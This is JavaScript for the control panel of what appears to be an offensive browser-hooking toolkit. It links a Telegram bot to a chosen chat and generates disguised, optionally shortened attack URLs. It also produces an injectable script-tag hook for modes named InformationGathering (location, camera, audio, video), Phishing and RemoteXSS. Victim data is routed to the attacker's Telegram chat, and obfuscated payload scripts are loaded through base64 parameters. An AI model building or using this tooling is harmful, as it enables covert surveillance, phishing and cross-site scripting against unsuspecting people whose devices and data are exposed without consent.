//INPUTS
const botTokenInput = document.getElementById("botTokenInput");
const hookJsonInput = document.getElementById("hookJsonInput");
const queryStringInput = document.getElementById("queryStringInput");
const baseUrlInput = document.getElementById("baseUrlInput");
const pollingIntervalInput = document.getElementById("pollingIntervalInput");
const youtubeVideoID  = document.getElementById("youtubeVideoID");

//BUTTONS
const showHidetokenButton = document.getElementById("showHidetokenButton");
const refreshClientButton = document.getElementById("refreshClientButton");
const startButton = document.getElementById("startButton");
const clearSavedDatabutton = document.getElementById("clearSavedDatabutton");
const generateButton = document.getElementById("generateButton");
const optionAccordionButton = document.getElementById("optionAccordionButton");
const shortURLLinkButton = document.getElementById("shortURLLinkButton");

//SELECT
const optionSelector = document.getElementById("optionSelector");
const urlShortnerDomainsSelect = document.getElementById("urlShortnerDomainsSelect");
const urlSelect = document.getElementById("urlSelect");
const youtubeIDSelect = document.getElementById("youtubeIDSelect");

//ACCORDION BODY
const chatIDAccordionBody = document.getElementById("chatIDAccordionBody");
const helpAccordionBody = document.getElementById("helpAccordionBody");

//CHECKBOX
const saveTokenCheckbox = document.getElementById("saveTokenCheckbox");
const shortenUrlCheckBox = document.getElementById("shortenUrlCheckBox");

//LABEL
const saveTokenLabel = document.getElementById("saveTokenLabel");
const copiedLabel = document.getElementById("copiedLabel");

//LABELS - SELECTED
const selectedBot = document.getElementById("selectedBot");
const selectedChatId = document.getElementById("selectedChatId");
const selectedOption = document.getElementById("selectedOption");

//LIST
const generateUrlErrorList = document.getElementById("generateUrlErrorList");

//DIVS
const errorOccuredDiv = document.getElementById("errorOccuredDiv");
const urlGeneratedDiv = document.getElementById("urlGeneratedDiv");

//CHECKBOX 
const obfuscateJsCheckbox = document.getElementById("obfuscateJsCheckbox");

//CHECKBOX -INFORMATION GATHERING
const basicCheckbox = document.getElementById("basicCheckbox");
const locationCheckbox = document.getElementById("locationCheckbox");
const cameraCheckbox = document.getElementById("cameraCheckbox");
const audioCheckbox = document.getElementById("audioCheckbox");
const VideoCheckbox = document.getElementById("VideoCheckbox");

copiedLabel.textContent = ""

//DYNAMIC VARIABLES
let selectedBotValue = undefined;
let selectedChatIdValue = undefined;
let selectedOptionValue = undefined;

let lastGeneratedURL = undefined;
let isUrlShort = false;

//INITIAL SETTING UP


//set saved token - if token is saved by user
if(localStorage.getItem("dat")!=undefined){
    botTokenInput.value = atob(localStorage.getItem("dat"));
};
const url = window.location.href;
const baseUrl = url.substring(0, url.lastIndexOf('/')) + '/';


//hooked json link - in generate modal

hookJsonInput.value = `<script src="${baseUrl}/hook.js"></script>`

//SUBFUNCTIONS

//get update (subfunction for //get the client ids)
const getBotUpdates=async(token)=>{
    try{
        const response = await fetch(`https://api.telegram.org/bot${token}/getUpdates?timeout=10`);
        return data = await response.json(); 
    }catch(e){return e;}
}

//refresh Chat ID (subfunction for refresh button and start button)
const refreshChatIds=async()=>{
    const data = await getBotUpdates(botTokenInput.value);
    if(data.ok === true){
        const result = data.result;
        let finalData = "";
        result.reverse().forEach(element => {
            const chatID = element.message.chat.id;
            const username = element.message.chat.username;
            const  first_name = element.message.chat.first_name;
            const text = element.message.text;
            const date = new Date(element.message.date*1000).toLocaleTimeString();
            if(text == "/start"){
                finalData+=`<li class="list-group-item chatIDItemList" onclick="selectChatId('${chatID}')" ><span class="chaidIdElement">${chatID}</span><span class="usernameElement" >[${username}-${first_name}]</span><span class="timeElement" >${date}</span></li>`;
            };
        });
        chatIDAccordionBody.innerHTML = finalData;

    };
};

//select chat id
const selectChatId=(value)=>{
    selectedChatIdValue = value;
    selectedChatId.textContent = selectedChatIdValue;
}

//get bot details (subfunction for //start)
const  getBotDetails=async(token)=>{
    try{
        const response = await fetch(`https://api.telegram.org/bot${token}/getMe`);
        return data = await response.json();     
    }catch(e){return e;}
};

//show one option hide others (subfunction for OPTION SELECTOR)
const showSelectedOption=(selectedOption)=>{
    const allOptions = ["InformationGathering","Phishing","RemoteXSS"];
    allOptions.forEach(element => {
        if(selectedOption == element){
            document.getElementById(element).style.display = "block";
        }else{
            document.getElementById(element).style.display = "none";
        }
    });
};

//information gathering part url generate  (subfunction for GENERATEURL)
const informationGatheringUrlGeneration=()=>{
    let value = "";
    if(basicCheckbox.checked === true){value+="b"}
    if(locationCheckbox.checked === true){value+="l"}
    if(cameraCheckbox.checked === true){value+="c"}
    if(audioCheckbox.checked === true){value+="a"}
    if(VideoCheckbox.checked === true){value+="v"}
    return value;
}
//get random charector (subfunction for GENERATEURL)
function getRandomChar() {
  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  return chars.charAt(Math.floor(Math.random() * chars.length));
}

//check if it is a url (subfunction for GENERATEURL)
function isURL(str) {
    const urlRegex = /^(https?:\/\/)?([\w-]+(\.[\w-]+)+)([\w.,@?^=%&:\/~+#-]*[\w@?^=%&\/~+#-])?$/i;
    return urlRegex.test(str);
}

//shorten url
const shortUrl=async(url)=>{
    const domainName = {"tinyurl":"https://tinyurl.com/api-create.php?url=||",
                        "clckru":"https://clck.ru/--?url=||",
                    };
                    
    const response = await fetch(domainName[urlShortnerDomainsSelect.value].replace("||",url));
    return response;
    
}


//main generate URL function (subfunction for GENERATE URL BUTTON)
const generateURL=async()=>{
        let value = "";
        let baseUrlValue = baseUrlInput.value;
        //remove last "/"" from the baseurl
        if(baseUrlValue[baseUrlValue.length-1]=="/"){baseUrlValue = baseUrlValue.slice(0,-1)}

        if(selectedOptionValue == "InformationGathering"){
            const url = window.location.href;
            const baseUrl = url.substring(0, url.lastIndexOf('/')) + '/';
            const scriptsUrlPath =  `${baseUrl}/`;
            const obfuscatedJS_path = btoa(`${scriptsUrlPath}infg_ob.js`);
            const normalJS_path = btoa(`${scriptsUrlPath}infg_pl.js`)
            if(obfuscateJsCheckbox.checked == true){value+=`?js=${obfuscatedJS_path}&`}else{value+=`?js=${normalJS_path}&`};
            const encryptedValue = btoa(`${botTokenInput.value}|${selectedChatIdValue}|${informationGatheringUrlGeneration()}`)
            value+=`val=${getRandomChar()}${encryptedValue}`; 
            if(youtubeVideoID.value!=""){
                value+=`&yt=${youtubeVideoID.value}`
            }
            let Finalvalue = `${isURL(baseUrlValue)?baseUrlValue:""}${value}`
            return Finalvalue;   
        }
        else if(selectedOptionValue == "RemoteXSS"){
            const url = window.location.href;
            const baseUrl = url.substring(0, url.lastIndexOf('/')) + '/';
            const scriptsUrlPath =  `${baseUrl}/`;
            const obfuscatedJS_path = btoa(`${scriptsUrlPath}rmxss_ob.js`);
            const normalJS_path = btoa(`${scriptsUrlPath}rmxss_pl.js`);
            if(obfuscateJsCheckbox.checked == true){value+=`?js=${obfuscatedJS_path}&`}else{value+=`?js=${normalJS_path}&`};
            const encryptedValue = btoa(`${botTokenInput.value}|${selectedChatIdValue}|${Number(pollingIntervalInput.value)}`);
            value+=`val=${getRandomChar()}${encryptedValue}`; 
            let Finalvalue = `${isURL(baseUrlValue)?baseUrlValue:""}${value}`
            return Finalvalue; 
        }
}


//copy query string/website url to clipboard
function copyQueryString() {
    queryStringInput.select();
    queryStringInput.setSelectionRange(0, 99999);  // For mobile devices

    // Using Clipboard API to copy
    navigator.clipboard.writeText(queryStringInput.value)
        .then(() => {
            copiedLabel.innerHTML = `Copied Website URL to clipboard <span class="copylabelCLoseButton" onClick="hideCopiedLabel()"><i class="bi bi-x-lg"></i></span>`
            copiedLabel.style.display = "block"
        })
        .catch(err => {
            console.error('Error copying text: ', err);
        });
}

//copy thook json content to clipboard
function copyHookJsonString() {
    hookJsonInput.select();
    hookJsonInput.setSelectionRange(0, 99999);  // For mobile devices

    // Using Clipboard API to copy
    navigator.clipboard.writeText(hookJsonInput.value)
        .then(() => {
            copiedLabel.innerHTML = `Copied JS Hook Script tag to clipboard <span class="copylabelCLoseButton" onClick="hideCopiedLabel()"><i class="bi bi-x-lg"></i></span>`
            copiedLabel.style.display = "block"
        })
        .catch(err => {
            console.error('Error copying text: ', err);
        });
}

//hide the copied to clipboard label
const hideCopiedLabel=()=>{
    copiedLabel.style.display = "none"
}

const shortURL=(url)=>{
    fetch(`https://tinyurl.com/api-create.php?url=${url}`)
    .then(response => response.text())
    .then(shortUrl => {
        queryStringInput.value = shortUrl;
    })
    .catch(error => {
        console.error("Error creating TinyURL:", error);
    });
}


//EVENT LISTENERS

//show hide bot token SHOW/HIDE BUTTON
showHidetokenButton.addEventListener('click',()=>{
    if(botTokenInput.type == "password"){
        botTokenInput.type = "text";
        showHidetokenButton.innerHTML = `<i class="bi bi-eye-slash-fill"></i>`;
    }else{
        botTokenInput.type = "password";
        showHidetokenButton.innerHTML = `<i class="bi bi-eye-fill"></i>`;
    }
});

//get the client ids REFRESH BUTTON
refreshClientButton.addEventListener('click',async()=>{
    refreshChatIds();
});



//start bot START BUTTOn
startButton.addEventListener('click',async()=>{
    if((botTokenInput.value).length<30){
        helpAccordionBody.textContent = "Enter a valid Bot token";
    }
    else{
        const data = await getBotDetails(botTokenInput.value)
        if(data.ok === true){
            const botUsername = data.result.username;
            const botFirstName = data.result.first_name;
            const botID = data.result.id;
            helpAccordionBody.innerHTML = `
            <ul class="getChatIdHelpUl">
            <li>Open Bot : <a  class="highlight" href="https://t.me/${botUsername}" target="_blank" rel="noopener noreferrer">${botUsername}</a>.</li>
            <li>Send "<span class="highlight">/start</span>" to the bot from the telegram app. </li>
            <li>Once sent, Press "<i class="bi bi-arrow-clockwise highlight"></i>" Icon.</li>
            <li>Recent Chat ID will be listed on Chat ID List.</li>
            <hr>
            <h5>Bot Details : </h5>
            <span>Username : <span class="highlight" >${botUsername}</span></span><br>
            <span>Name : <span class="highlight" >${botFirstName}</span></span><br>
            <span>ID : <span class="highlight" >${botID}</span></span>
            </ul>
            `;

            selectedBotValue = botUsername;
            selectedBot.textContent = selectedBotValue;

            
            //save token to localstorage
            if(saveTokenCheckbox.checked){
                localStorage.setItem('dat',btoa(botTokenInput.value));
                saveTokenLabel.innerHTML= saveTokenLabel.innerHTML+`<i class="bi bi-check"></i>`
            }
            refreshChatIds();
            
        }
        else{
            helpAccordionBody.innerHTML = `<p>INVALID BOT TOKEN</p>`;
        }
    }
});


//clear any saved data
clearSavedDatabutton.addEventListener('click',()=>{
    localStorage.clear();
    saveTokenLabel.innerHTML= `Save Token (local storage)`;
    
});

//option selector on change
optionSelector.addEventListener('change',()=>{
    selectedOptionValue = optionSelector.value;
    selectedOption.textContent = selectedOptionValue;
    showSelectedOption(selectedOptionValue);
    
});

//generate button generate url
generateButton.addEventListener("click",async()=>{
    if(selectedBotValue!=undefined && selectedChatIdValue!=undefined && selectedOptionValue!=undefined  &&optionSelector.value!="--" && isURL(baseUrlInput.value)){
        queryStringInput.value = await generateURL()
        errorOccuredDiv.style.display = "none";
        urlGeneratedDiv.style.display = "block"
        
    }else{
        // && selectedChatIdValue!=undefined && selectedOptionValue!=undefined 
        //incomplete selections
        errorOccuredDiv.style.display = "block";
        urlGeneratedDiv.style.display = "none"
        generateUrlErrorList.innerHTML = `
        ${selectedBotValue==undefined?`<li>Bot Not Selected</li>`:""}
        ${selectedOptionValue==undefined || optionSelector.value == "--"?`<li>Option Not Selected</li>`:""}
        ${selectedChatIdValue==undefined?`<li> Chat ID Not Selected</li>`:""}
        ${baseUrlInput.value == ""?`<li>Base URL Required </li>`:""}
        ${!isURL(baseUrlInput.value) && baseUrlInput.value!=""?`<li>Valid Base URL Required </li>`:""}
        `;
    }
});

//store baseurl to localstorage
baseUrlInput.addEventListener('change',()=>{
    if(isURL(baseUrlInput)==true){localStorage.setItem('baseUrl',baseUrlInput.value);}    
});


//short link URL 
shortURLLinkButton.addEventListener('click',async()=>{
    shortURL(queryStringInput.value);
    isUrlShort = true;
    copiedLabel.innerHTML = `Shortened the URL <span class="copylabelCLoseButton" onClick="hideCopiedLabel()"><i class="bi bi-x-lg"></i></span>`
    copiedLabel.style.display = "block"
});

//set sample url
urlSelect.addEventListener('change',()=>{
    if(urlSelect.value == "test"){
        //set baseurl to test website url
        baseUrlInput.value = `${baseUrl}test.html`;
    }
    else if(urlSelect.value == "yt"){
        //set baseurl to youtube -test website url
        baseUrlInput.value = `${baseUrl}youtube.html`;
    }
    else if(urlSelect.value == "clear"){
        //set baseurl to test website url
        baseUrlInput.value = "";
    }
    
});

//select youtube id Samples
youtubeIDSelect.addEventListener('change',()=>{
    if(youtubeIDSelect.value == "clear"){
        youtubeVideoID.value = "";
    }else{
        youtubeVideoID.value = youtubeIDSelect.value;
    }
})
